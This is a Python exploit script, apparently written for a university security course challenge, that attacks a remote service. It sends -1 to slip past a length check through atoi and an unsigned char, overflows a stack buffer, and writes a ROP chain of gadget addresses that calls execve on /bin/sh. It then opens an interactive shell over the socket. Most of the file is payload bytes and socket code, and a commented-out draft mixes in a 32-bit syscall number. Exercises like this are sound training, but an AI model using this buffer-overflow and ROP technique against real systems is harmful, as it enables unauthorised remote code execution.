import socket
import telnetlib
import binascii

# okay so, the first step will be to actually get a running buffer overflow.
# we have at least "some" prevention.
# lets do this!

# open socket to host
s = socket.socket()
s.connect(("itsec.sec.in.tum.de", 7051))
sf = s.makefile("rwb")

# read the "How long is your name?"
print(sf.readline().strip())

# so how to we circumvent the buffer overflow checks?
# We see that `atoi(line)` is called twice, one time for the check and one time to assign `len`.
# The one important aspect is: atoi parses negative numbers! And, `len` is an unsigned char.
# Therefore, by simply passing -1 we can bypass the `MAX_INPUT_LEN` check and write the maximum
# possible value (255) into `len`.

print("-1")
sf.write(b"-1\n")
sf.flush()

# read the "Enter ur name of length 255:"
print(sf.readline().strip())

# LETS DO SOME RESEARCH AND ACQUIRE SOME KNOWLEDGE:
# as after we have the buffer overflow, our goal will be to craft a rop chain
# which results in a syscall to `execve`. Such that we can e.g. execute "/bin/sh" located in `cool_string`.
#
# SYSCALL execve.
# Looking at https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm,
#  and https://elixir.bootlin.com/linux/v2.6.32/source/arch/arm/include/asm/unistd.h
#  we will have the following register values
#  RAX = 11 (sys call id)
#  RBX = <addr to the executable> (const char*)
#  RCX = argv (pointer to NULL terminated array of of char pointers which are NULL terminated)
#  RDX = envp (same structure as argv)

# we used `ROPgadget --depth 20 --binary vuln` to extract all available rop chains.
# we only list the relevant ones here:
#
# The first ones are the ones supplied be the author itself:
# 0x0000000000401176 : pop rax ; ret  # aka the `maybe_useful`
# 0x0000000000401178 : pop rdx ; ret  # aka the `maybe_also_useful`
# 0x000000000040117a : syscall        # aka the `maybe_extremely_useful`
#
# We additionally list:
# 0x000000000040130a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#
# TODO we don't have anything for rcx!
#
# variable `cool_string` is located at 0x00402008 (found using string search in ghidra)
# A pointer to `cool_string` (which is null terminated) lies in 0x00404058 (we need this for argv)

# let's craft our malformed input.
# * first 20 bytes will be written to `input_buf`
# * then 1 byte into `len` (if this value is bigger 20 we need to expect additional line of output below!)
# * 8 bytes of size_t `n`
# * 8 bytes of char* `line`
# * 8 bytes of BSP
# * 8 bytes for the RETURN ADDRESS (our rop entry point)
# * Anything after that we place our ROP CHAIN
#
# The ROP chain is as follows:
# * 0x0000000000401176 into current RETURN ADDRESS! (jumping to `maybe_useful`)
# * 0x0b (11) (pop RAX; assuming 64 bit LE)
#    [11 is the syscall id for execev]
# * 0x0000000000401178 (gadget `maybe_also_useful`)
# * 0x00 (pop RDX) (the envp argument)
# * 0x000000000040130a  (the gadget we find ourselves to write RBX)
# * 0x00402008 (pop rbx) ptr to `cool_string` (/bin/sh)
# * 0x00 (pop rbp)
# * 0x00 (pop r12)
# * 0x00 (pop r13)
# * 0x00 (pop r14)
# * 0x00 (pop r15)
# * 0x000000000040117a (syscall) TODO we do not have written to rcx, might be fine?

# input = 20*"A" +\
#         "\xFF" +\
#         8*"\x00" +\
#         8*"\x00" +\
#         8*"\x00"
# ropChain = "\x76\x11\x40\x00" + 4*"\x00" +\
#         "\x0b" + 7*"\x00" +\
#         "\x78\x11\x40\x00" + 4*"\x00" +\
#         8*"\x00" +\
#         "\x0a\x14\x40\x00" + 4*"\x00" +\
#         "\x08\x20\x40\x00" + 4*"\x00" +\
#         8*"\x00" +\
#         8*"\x00" +\
#         8*"\x00" +\
#         8*"\x00" +\
#         8*"\x00" +\
#         "\x7a\x11\x40\x00" + 4*"\x00"


# Variables common

input_buf_ABCAAA =                  bytes([0x41, 0x42, 0x43, 0x41, 0x41, 0x41, 0x41, 0x41,
                                           0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
                                           0x41, 0x41, 0x41, 0x41]) # "ABCAAAAAAAAAAAAAAAAA"

len_var =                           bytes([0x00, 0x00, 0x00, 0xff])


# # Variables for actual vuln

address_maybe_useful =              bytes([0x76, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_maybe_also_useful =         bytes([0x78, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_maybe_extremely_useful =    bytes([0x7a, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_cool_string =               bytes([0x08, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])

address_pop_rdi_gadget =            bytes([0x13, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
address_pop_rsi_r15_gadget =        bytes([0x11, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])


# Variables for local vuln2

# address_maybe_useful =              bytes([0x72, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
# address_maybe_also_useful =         bytes([0x74, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
# address_maybe_extremely_useful =    bytes([0x76, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
# address_maybe_not_so_useful =       bytes([0x79, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
# address_cool_string =               bytes([0x08, 0x20, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])

# address_pop_rdi_gadget =            bytes([0x0b, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])
# address_pop_rsi_r15_gadget =        bytes([0x09, 0x13, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00])

input = input_buf_ABCAAA +\
        bytes([0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00]) +\
        len_var +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_maybe_useful +\
        bytes([0x3b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_maybe_also_useful +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_pop_rdi_gadget +\
        address_cool_string +\
        address_pop_rsi_r15_gadget +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) +\
        address_maybe_extremely_useful


print(binascii.hexlify(input, "-", -4))  # debug print to verify for ourselves
sf.write(input)  # TODO append ROP CHAIN!
sf.flush()

# enter interactive mode
print("Entering interactive mode:")

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()  # bye bye
